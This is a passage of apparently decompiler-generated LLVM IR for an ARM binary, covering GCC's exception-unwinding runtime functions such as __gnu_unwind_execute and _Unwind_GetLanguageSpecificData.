  %v20_18178 = load i32, i32* %v19_18178, align 4
  store i32 %v20_18178, i32* @r6, align 4
  %v21_18178 = add i32 %tmp, 28
  %v22_18178 = inttoptr i32 %v21_18178 to i32*
  %v23_18178 = load i32, i32* %v22_18178, align 4
  store i32 %v23_18178, i32* @r7, align 4
  %v24_18178 = add i32 %tmp, 32
  %v25_18178 = inttoptr i32 %v24_18178 to i32*
  %v26_18178 = load i32, i32* %v25_18178, align 4
  store i32 %v26_18178, i32* @r8, align 4
  %v27_18178 = add i32 %tmp, 36
  %v28_18178 = inttoptr i32 %v27_18178 to i32*
  %v29_18178 = load i32, i32* %v28_18178, align 4
  store i32 %v29_18178, i32* @sb, align 4
  %v30_18178 = add i32 %tmp, 40
  %v31_18178 = inttoptr i32 %v30_18178 to i32*
  %v32_18178 = load i32, i32* %v31_18178, align 4
  store i32 %v32_18178, i32* @sl, align 4
  store i32 %v8_1816c, i32* @ip, align 4
  store i32 %v5_1816c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1816c)
  ret i32 %v2_18178

; uselistorder directives
  uselistorder i32 %v8_1816c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 143, 144, 145, 10, 146, 23, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 31, 58, 59, 33, 32, 0, 34, 35, 1, 36, 37, 38, 39, 60, 61, 62, 63, 64, 67, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 40, 42, 41, 2, 44, 45, 46, 47, 48, 49, 50, 51, 43, 52, 53, 54, 55, 83, 84, 85, 86, 87, 88, 89, 90, 91, 98, 11, 12, 13, 103, 104, 105, 106, 108, 109, 107, 110, 4, 111, 5, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 56, 57, 6, 149, 147, 148, 150, 151, 92, 93, 94, 95, 96, 97, 69, 129, 130, 131, 138, 139, 99, 100, 65, 9, 66, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 7, 186, 187, 188, 189, 190, 191, 192, 193, 194, 14, 15, 101, 102, 16, 195, 196, 140, 141, 132, 133, 17, 135, 8, 136, 137, 18, 134, 152, 200, 197, 198, 199, 3, 201, 142, 19 }
  uselistorder i32 40, { 24, 20, 21, 22, 23, 7, 14, 15, 8, 9, 10, 11, 12, 18, 13, 25, 2, 4, 5, 19, 1, 17, 6, 3, 16, 0 }
  uselistorder i32* @sb, { 79, 19, 20, 21, 22, 27, 28, 29, 30, 6, 7, 8, 9, 10, 11, 12, 0, 13, 31, 32, 33, 34, 35, 36, 37, 55, 43, 44, 45, 1, 46, 56, 2, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 14, 15, 16, 80, 81, 47, 48, 49, 50, 51, 52, 53, 54, 67, 68, 69, 70, 71, 72, 73, 38, 39, 40, 41, 42, 23, 24, 25, 26, 3, 17, 18, 74, 77, 75, 76, 78, 4, 5 }
  uselistorder i32 36, { 23, 22, 6, 4, 13, 14, 10, 11, 17, 18, 19, 20, 21, 15, 7, 12, 8, 24, 0, 1, 2, 5, 16, 9, 3 }
  uselistorder i32* @r8, { 153, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 3, 152, 40, 41, 42, 43, 44, 45, 50, 51, 19, 20, 21, 22, 23, 24, 25, 2, 26, 0, 27, 28, 29, 30, 13, 14, 52, 53, 54, 55, 56, 57, 58, 59, 60, 67, 73, 90, 91, 92, 93, 94, 95, 4, 96, 97, 98, 99, 100, 101, 31, 32, 33, 74, 1, 75, 76, 154, 155, 68, 69, 5, 70, 71, 72, 102, 103, 104, 105, 106, 107, 108, 109, 9, 10, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 11, 61, 6, 62, 63, 64, 65, 66, 46, 47, 48, 49, 34, 35, 36, 156, 12, 37, 38, 39, 15, 16, 7, 17, 114, 115, 116, 117, 118, 8, 119, 120, 121, 122, 123, 124, 125, 126, 110, 111, 112, 113, 127, 128, 129, 130, 131, 132, 133, 134, 18 }
  uselistorder i32 32, { 98, 31, 95, 96, 97, 50, 51, 52, 53, 24, 25, 33, 48, 49, 27, 28, 54, 26, 34, 55, 56, 57, 58, 32, 59, 60, 38, 18, 61, 62, 76, 78, 79, 63, 64, 17, 65, 0, 39, 66, 67, 68, 69, 70, 71, 19, 45, 90, 91, 40, 92, 80, 81, 72, 73, 99, 46, 100, 23, 44, 101, 16, 84, 85, 77, 94, 35, 29, 88, 86, 87, 74, 75, 89, 41, 1, 47, 82, 83, 42, 2, 3, 5, 4, 93, 7, 6, 9, 8, 11, 10, 30, 13, 12, 20, 21, 15, 14, 22, 36, 37, 43 }
  uselistorder i32 28, { 51, 17, 18, 33, 4, 19, 20, 21, 22, 23, 24, 25, 0, 26, 7, 35, 5, 38, 6, 39, 44, 46, 47, 8, 48, 9, 45, 10, 11, 40, 34, 12, 27, 13, 52, 28, 53, 54, 55, 56, 36, 37, 32, 49, 14, 50, 1, 41, 42, 29, 43, 15, 30, 16, 2, 31, 3 }
  uselistorder i32 24, { 48, 47, 9, 10, 27, 31, 33, 34, 11, 12, 13, 14, 15, 16, 17, 18, 0, 44, 4, 35, 36, 19, 20, 49, 5, 6, 50, 37, 38, 32, 45, 1, 42, 39, 40, 41, 28, 29, 21, 43, 7, 30, 22, 23, 24, 3, 8, 25, 26, 46, 2 }
  uselistorder i32 20, { 51, 49, 50, 52, 2, 6, 11, 7, 0, 15, 16, 17, 33, 34, 8, 18, 19, 20, 21, 3, 9, 39, 35, 36, 22, 23, 53, 24, 54, 55, 56, 37, 38, 32, 57, 10, 58, 59, 4, 60, 40, 12, 25, 41, 29, 30, 31, 26, 13, 27, 28, 1, 61, 42, 43, 44, 45, 46, 47, 48, 14, 5 }
  uselistorder i32* @r1, { 235, 21, 20, 22, 4, 236, 58, 59, 19, 60, 61, 62, 63, 64, 23, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 54, 55, 24, 56, 57, 76, 5, 77, 78, 79, 80, 81, 82, 83, 18, 84, 85, 86, 87, 124, 25, 88, 125, 126, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 26, 127, 141, 27, 28, 100, 101, 102, 29, 39, 103, 104, 105, 15, 106, 107, 108, 30, 109, 110, 142, 143, 144, 237, 145, 146, 147, 148, 149, 150, 151, 155, 156, 157, 158, 159, 162, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 204, 205, 6, 206, 207, 208, 209, 16, 111, 112, 210, 212, 211, 31, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 7, 163, 164, 115, 173, 117, 113, 2, 239, 114, 238, 242, 36, 160, 161, 8, 138, 139, 224, 225, 226, 227, 228, 174, 175, 176, 177, 121, 32, 128, 1, 129, 130, 37, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 10, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 9, 285, 286, 38, 33, 165, 167, 168, 169, 170, 171, 172, 131, 132, 133, 134, 135, 136, 166, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 152, 140, 3, 137, 34, 116, 118, 287, 35, 289, 290, 291, 292, 45, 53, 288, 153, 154, 231, 11, 232, 12, 233, 229, 41, 202, 203, 17, 243, 42, 13, 46, 47, 48, 49, 50, 51, 52, 14, 295, 296, 297, 298, 0, 299, 43, 40, 293, 294, 240, 241, 44, 119, 120, 122, 123, 230, 234 }
  uselistorder i32 60, { 2, 22, 23, 24, 10, 11, 3, 18, 19, 20, 21, 14, 15, 4, 12, 13, 5, 16, 17, 6, 7, 1, 8, 9, 0 }
  uselistorder i32 56, { 3, 31, 32, 7, 8, 9, 6, 17, 18, 10, 11, 1, 4, 23, 24, 25, 26, 27, 28, 29, 14, 15, 16, 13, 12, 2, 30, 19, 20, 21, 22, 0, 5 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18188 = load i32, i32* @r0, align 4
  ret i32 %v1_18188
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18190 = load i32, i32* @r0, align 4
  ret i32 %v1_18190
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_181a4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_181a8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_181a4, i32 0)
  ret i32 %v2_181a8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_181c8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_181cc = call i32 @__gnu_Unwind_Resume(i32 %v2_181c8, i32 0)
  ret i32 %v2_181cc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_181ec = ptrtoint i32* %stack_var_-68 to i32
  %v2_181f0 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_181ec, i32 0)
  ret i32 %v2_181f0

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18210 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18214 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18210, i32 %arg2, i8* %arg3, i32 %v2_18210)
  ret i32 %v6_18214

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18240 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18248 = add i32 %tmp1, 76
  %v2_18248 = inttoptr i32 %v1_18248 to i32*
  %v3_18248 = load i32, i32* %v2_18248, align 4
  %v1_1824c = add i32 %v3_18248, 7
  %v2_1824c = inttoptr i32 %v1_1824c to i8*
  %v3_1824c = load i8, i8* %v2_1824c, align 1
  %v4_1824c = zext i8 %v3_1824c to i32
  %v1_18250 = add i32 %v3_18248, 8
  %v3_18254 = mul nuw nsw i32 %v4_1824c, 4
  %v2_18258 = add i32 %v3_18254, %v1_18250
  %v3_18258 = inttoptr i32 %v2_18258 to i8*
  ret i8* %v3_18258
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18268 = load i32, i32* @r6, align 4
  %v21_18268 = load i32, i32* @lr, align 4
  %v0_1826c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1826c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1827c

dec_label_pc_1827c:                               ; preds = %dec_label_pc_1827c.backedge, %entry
  %v3_18288 = phi i32 [ %v0_1827c.pre, %dec_label_pc_1827c.backedge ], [ %tmp, %entry ]
  %v1_1827c = add i32 %v3_18288, 8
  %v2_1827c = inttoptr i32 %v1_1827c to i8*
  %v3_1827c = load i8, i8* %v2_1827c, align 1
  %v4_1827c = zext i8 %v3_1827c to i32
  store i32 %v4_1827c, i32* %r3.global-to-local, align 4
  %v2_18280 = icmp eq i8 %v3_1827c, 0
  store i1 %v2_18280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18280, label %dec_label_pc_18290, label %.thread

.thread:                                          ; preds = %dec_label_pc_1827c
  %v2_18284 = add nsw i32 %v4_1827c, -1
  store i32 %v2_18284, i32* %r3.global-to-local, align 4
  %v2_18288 = trunc i32 %v2_18284 to i8
  store i8 %v2_18288, i8* %v2_1827c, align 1
  %v0_1828c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1828c.pr.pr, label %.thread.dec_label_pc_18290_crit_edge, label %dec_label_pc_182b8

.thread.dec_label_pc_18290_crit_edge:             ; preds = %.thread
  %v0_18290.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18290

dec_label_pc_18290:                               ; preds = %.thread.dec_label_pc_18290_crit_edge, %dec_label_pc_1827c
  %v0_18290 = phi i32 [ %v0_18290.pre, %.thread.dec_label_pc_18290_crit_edge ], [ %v3_18288, %dec_label_pc_1827c ]
  %v1_18290 = add i32 %v0_18290, 9
  %v2_18290 = inttoptr i32 %v1_18290 to i8*
  %v3_18290 = load i8, i8* %v2_18290, align 1
  %v4_18290 = zext i8 %v3_18290 to i32
  store i32 %v4_18290, i32* %r3.global-to-local, align 4
  %v2_18294 = icmp eq i8 %v3_18290, 0
  store i1 %v2_18294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18294, label %dec_label_pc_18398, label %dec_label_pc_1829c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_1838c, %dec_label_pc_18290
  %v2_182a0 = phi i32 [ %v0_1838c, %dec_label_pc_1838c ], [ %v0_18290, %dec_label_pc_18290 ]
  %v0_1829c = phi i32 [ %v4_1838c, %dec_label_pc_1838c ], [ %v4_18290, %dec_label_pc_18290 ]
  %v1_1829c = add nsw i32 %v0_1829c, -1
  store i32 %v1_1829c, i32* %r3.global-to-local, align 4
  %v1_182a0 = trunc i32 %v1_1829c to i8
  %v3_182a0 = add i32 %v2_182a0, 9
  %v4_182a0 = inttoptr i32 %v3_182a0 to i8*
  store i8 %v1_182a0, i8* %v4_182a0, align 1
  %v0_182a4 = load i32, i32* @r5, align 4
  %v1_182a4 = add i32 %v0_182a4, 4
  %v2_182a4 = inttoptr i32 %v1_182a4 to i32*
  %v3_182a4 = load i32, i32* %v2_182a4, align 4
  store i32 %v3_182a4, i32* %r2.global-to-local, align 4
  %v1_182a8 = inttoptr i32 %v3_182a4 to i32*
  %v2_182a8 = load i32, i32* %v1_182a8, align 4
  store i32 %v2_182a8, i32* %r0.global-to-local, align 4
  %v4_182a8 = add i32 %v3_182a4, 4
  store i32 %v4_182a8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_182b0 = inttoptr i32 %v0_182a4 to i32*
  store i32 %v2_182a8, i32* %v1_182b0, align 4
  %v5_182b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_182b0, i32* %v2_182a4, align 4
  %v0_182b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_182b4 = trunc i32 %v0_182b4 to i8
  %v2_182b4 = load i32, i32* @r5, align 4
  %v3_182b4 = add i32 %v2_182b4, 8
  %v4_182b4 = inttoptr i32 %v3_182b4 to i8*
  store i8 %v1_182b4, i8* %v4_182b4, align 1
  br label %dec_label_pc_182b8

dec_label_pc_182b8:                               ; preds = %.thread, %dec_label_pc_1829c, %.thread6
  %v0_182b8 = load i32, i32* @r5, align 4
  %v1_182b8 = inttoptr i32 %v0_182b8 to i32*
  %v2_182b8 = load i32, i32* %v1_182b8, align 4
  %v3_182bc = udiv i32 %v2_182b8, 16777216
  store i32 %v3_182bc, i32* @r4, align 4
  store i32 %v3_182bc, i32* %ip.global-to-local, align 4
  %v3_182c4 = mul i32 %v2_182b8, 256
  store i32 %v3_182c4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_182b8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_182c4, i32* %v1_182b8, align 4
  br i1 %tmp183, label %dec_label_pc_18398, label %dec_label_pc_182d4

dec_label_pc_182d4:                               ; preds = %dec_label_pc_182b8
  %v0_182d4 = load i32, i32* @r4, align 4
  %v1_182d4 = and i32 %v0_182d4, 128
  store i32 %v1_182d4, i32* %r1.global-to-local, align 4
  %v2_182d4 = icmp eq i32 %v1_182d4, 0
  store i1 %v2_182d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182d4, label %dec_label_pc_183b0, label %dec_label_pc_182dc

dec_label_pc_182dc:                               ; preds = %dec_label_pc_182d4
  %v1_182dc = and i32 %v0_182d4, 240
  store i32 %v1_182dc, i32* @r6, align 4
  %v7_182e0 = icmp eq i32 %v1_182dc, 128
  store i1 %v7_182e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_182e0, label %dec_label_pc_182e8, label %dec_label_pc_1840c

dec_label_pc_182e8:                               ; preds = %dec_label_pc_182dc
  %v0_182e8 = load i32, i32* @r5, align 4
  %v1_182e8 = add i32 %v0_182e8, 8
  %v2_182e8 = inttoptr i32 %v1_182e8 to i8*
  %v3_182e8 = load i8, i8* %v2_182e8, align 1
  %v4_182e8 = zext i8 %v3_182e8 to i32
  store i32 %v4_182e8, i32* %r3.global-to-local, align 4
  %v2_182ec = icmp eq i8 %v3_182e8, 0
  store i1 %v2_182ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_182ec, label %dec_label_pc_182fc, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_182e8
  %v2_182f0 = add nsw i32 %v4_182e8, -1
  store i32 %v2_182f0, i32* %r3.global-to-local, align 4
  %v2_182f4 = trunc i32 %v2_182f0 to i8
  store i8 %v2_182f4, i8* %v2_182e8, align 1
  %v0_182f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_182f8.pr.pr, label %.thread3.dec_label_pc_182fc_crit_edge, label %dec_label_pc_1832c

.thread3.dec_label_pc_182fc_crit_edge:            ; preds = %.thread3
  %v0_182fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_182fc

dec_label_pc_182fc:                               ; preds = %.thread3.dec_label_pc_182fc_crit_edge, %dec_label_pc_182e8
  %v2_18310 = phi i32 [ %v0_182fc.pre, %.thread3.dec_label_pc_182fc_crit_edge ], [ %v0_182e8, %dec_label_pc_182e8 ]
  %v1_182fc = add i32 %v2_18310, 9
  %v2_182fc = inttoptr i32 %v1_182fc to i8*
  %v3_182fc = load i8, i8* %v2_182fc, align 1
  %v4_182fc = zext i8 %v3_182fc to i32
  store i32 %v4_182fc, i32* %r3.global-to-local, align 4
  %v2_18300 = icmp eq i8 %v3_182fc, 0
  store i1 %v2_18300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18300, label %dec_label_pc_1833c, label %dec_label_pc_1830c

dec_label_pc_1830c:                               ; preds = %dec_label_pc_182fc
  %v1_1830c = add nsw i32 %v4_182fc, -1
  store i32 %v1_1830c, i32* %r3.global-to-local, align 4
  %v1_18310 = trunc i32 %v1_1830c to i8
  store i8 %v1_18310, i8* %v2_182fc, align 1
  %v0_18314 = load i32, i32* @r5, align 4
  %v1_18314 = add i32 %v0_18314, 4
  %v2_18314 = inttoptr i32 %v1_18314 to i32*
  %v3_18314 = load i32, i32* %v2_18314, align 4
  store i32 %v3_18314, i32* %r2.global-to-local, align 4
  %v1_18318 = inttoptr i32 %v3_18314 to i32*
  %v2_18318 = load i32, i32* %v1_18318, align 4
  store i32 %v2_18318, i32* %r0.global-to-local, align 4
  %v4_18318 = add i32 %v3_18314, 4
  store i32 %v4_18318, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18318, i32* %v2_18314, align 4
  %v0_18324 = load i32, i32* %r3.global-to-local, align 4
  %v1_18324 = trunc i32 %v0_18324 to i8
  %v2_18324 = load i32, i32* @r5, align 4
  %v3_18324 = add i32 %v2_18324, 8
  %v4_18324 = inttoptr i32 %v3_18324 to i8*
  store i8 %v1_18324, i8* %v4_18324, align 1
  %v0_18328 = load i32, i32* %r0.global-to-local, align 4
  %v1_18328 = load i32, i32* @r5, align 4
  %v2_18328 = inttoptr i32 %v1_18328 to i32*
  store i32 %v0_18328, i32* %v2_18328, align 4
  br label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %.thread3, %dec_label_pc_1830c
  %v0_1832c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1832c, i32* %r3.global-to-local, align 4
  %v3_18330 = mul i32 %v0_1832c, 256
  store i32 %v3_18330, i32* %r0.global-to-local, align 4
  %v1_18334 = load i32, i32* @r5, align 4
  %v2_18334 = inttoptr i32 %v1_18334 to i32*
  store i32 %v3_18330, i32* %v2_18334, align 4
  %v0_18338 = load i32, i32* %r3.global-to-local, align 4
  %v3_18338 = udiv i32 %v0_18338, 16777216
  br label %dec_label_pc_1833c

dec_label_pc_1833c:                               ; preds = %dec_label_pc_182fc, %dec_label_pc_1832c
  %storemerge133 = phi i32 [ %v3_18338, %dec_label_pc_1832c ], [ 176, %dec_label_pc_182fc ]
  %v1_1833c = load i32, i32* %ip.global-to-local, align 4
  %v4_1833c = mul i32 %v1_1833c, 256
  %v5_1833c = or i32 %v4_1833c, %storemerge133
  store i32 %v5_1833c, i32* %r2.global-to-local, align 4
  %v7_18340 = icmp eq i32 %v5_1833c, 32768
  store i1 %v7_18340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18340, label %dec_label_pc_1854c, label %dec_label_pc_18348

dec_label_pc_18348:                               ; preds = %dec_label_pc_1833c
  %v3_18348 = mul i32 %v5_1833c, 16
  store i32 %v3_18348, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18358 = and i32 %v3_18348, 65520
  store i32 %v3_18358, i32* %r2.global-to-local, align 4
  %v0_1835c = load i32, i32* @r7, align 4
  store i32 %v0_1835c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18364 = call i32 @_Unwind_VRS_Pop(i32 %v0_1835c, i32 %v3_18358, i32 0, i32 0)
  store i32 %v4_18364, i32* %r0.global-to-local, align 4
  %v2_18368 = icmp eq i32 %v4_18364, 0
  store i1 %v2_18368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18368, label %dec_label_pc_18370, label %dec_label_pc_1854c

dec_label_pc_18370:                               ; preds = %dec_label_pc_18348
  %v0_18370 = load i32, i32* @r5, align 4
  %v1_18370 = add i32 %v0_18370, 8
  %v2_18370 = inttoptr i32 %v1_18370 to i8*
  %v3_18370 = load i8, i8* %v2_18370, align 1
  %v4_18370 = zext i8 %v3_18370 to i32
  store i32 %v4_18370, i32* %r3.global-to-local, align 4
  %v0_18374 = load i32, i32* @r4, align 4
  %v1_18374 = and i32 %v0_18374, 32768
  %v2_18374 = icmp eq i32 %v1_18374, 0
  store i1 %v2_18374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18374, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18370
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18370, %bb147
  %v2_1837c = icmp eq i8 %v3_18370, 0
  store i1 %v2_1837c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1837c, label %dec_label_pc_1838c, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18380 = add nsw i32 %v4_18370, -1
  store i32 %v2_18380, i32* %r3.global-to-local, align 4
  %v2_18384 = trunc i32 %v2_18380 to i8
  store i8 %v2_18384, i8* %v2_18370, align 1
  %v0_18388.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18388.pr.pr, label %.thread6.dec_label_pc_1838c_crit_edge, label %dec_label_pc_182b8

.thread6.dec_label_pc_1838c_crit_edge:            ; preds = %.thread6
  %v0_1838c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1838c

dec_label_pc_1838c:                               ; preds = %bb148, %.thread6.dec_label_pc_1838c_crit_edge
  %v0_1838c = phi i32 [ %v0_1838c.pre, %.thread6.dec_label_pc_1838c_crit_edge ], [ %v0_18370, %bb148 ]
  %v1_1838c = add i32 %v0_1838c, 9
  %v2_1838c = inttoptr i32 %v1_1838c to i8*
  %v3_1838c = load i8, i8* %v2_1838c, align 1
  %v4_1838c = zext i8 %v3_1838c to i32
  store i32 %v4_1838c, i32* %r3.global-to-local, align 4
  %v2_18390 = icmp eq i8 %v3_1838c, 0
  store i1 %v2_18390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18390, label %dec_label_pc_18398, label %dec_label_pc_1829c

dec_label_pc_18398:                               ; preds = %dec_label_pc_1838c, %dec_label_pc_18290, %dec_label_pc_182b8
  %v0_18398 = load i32, i32* @sl, align 4
  %v2_18398 = icmp eq i32 %v0_18398, 0
  store i1 %v2_18398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18398, label %dec_label_pc_18460, label %bb149

bb149:                                            ; preds = %dec_label_pc_18398
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_183a4:                               ; preds = %bb149, %dec_label_pc_18914, %dec_label_pc_187b4, %dec_label_pc_185d8, %dec_label_pc_18590, %dec_label_pc_1854c, %dec_label_pc_18460
  %v1_183ac = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_18914 ], [ 9, %dec_label_pc_187b4 ], [ 9, %dec_label_pc_185d8 ], [ 9, %dec_label_pc_18590 ], [ 9, %dec_label_pc_1854c ], [ %v0_18494, %dec_label_pc_18460 ]
  store i32 %v9_18268, i32* %r6.global-to-local, align 4
  store i32 %v21_18268, i32* @lr, align 4
  ret i32 %v1_183ac

dec_label_pc_183b0:                               ; preds = %dec_label_pc_182d4
  %v1_183b0 = mul i32 %v0_182d4, 4
  %v3_183b4 = and i32 %v1_183b0, 252
  store i32 %v3_183b4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_183c0 = load i32, i32* @r7, align 4
  store i32 %v0_183c0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_183c8 = add nuw nsw i32 %v3_183b4, 4
  store i32 %v1_183c8, i32* %r6.global-to-local, align 4
  %v5_183d0 = call i32 @_Unwind_VRS_Get(i32 %v0_183c0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_183d4 = load i32, i32* @r4, align 4
  %v1_183d4 = and i32 %v0_183d4, 64
  %v2_183d4 = icmp eq i32 %v1_183d4, 0
  store i1 %v2_183d4, i1* %cpsr_z.global-to-local, align 1
  %v4_183dc = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_183e8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_183e8
  %storemerge160.p = select i1 %v2_183d4, i32 %v2_183e8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_183dc
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18404 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18404, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1827c.backedge

dec_label_pc_1827c.backedge:                      ; preds = %dec_label_pc_183b0, %dec_label_pc_1842c, %dec_label_pc_188b0, %dec_label_pc_1857c, %dec_label_pc_185b4, %dec_label_pc_18534, %dec_label_pc_187a0
  %v0_1827c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1827c

dec_label_pc_1840c:                               ; preds = %dec_label_pc_182dc
  %v7_1840c = icmp eq i32 %v1_182dc, 144
  store i1 %v7_1840c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1840c, label %dec_label_pc_18414, label %dec_label_pc_18554

dec_label_pc_18414:                               ; preds = %dec_label_pc_1840c
  %v1_18414 = urem i32 %v0_182d4, 16
  store i32 %v1_18414, i32* %r2.global-to-local, align 4
  %v2_18418 = icmp eq i32 %v1_18414, 15
  store i1 %v2_18418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18418, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18414
  %v8_1841c = icmp eq i32 %v1_18414, 13
  store i1 %v8_1841c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1841c, label %bb154, label %dec_label_pc_1842c

.thread21:                                        ; preds = %dec_label_pc_18414
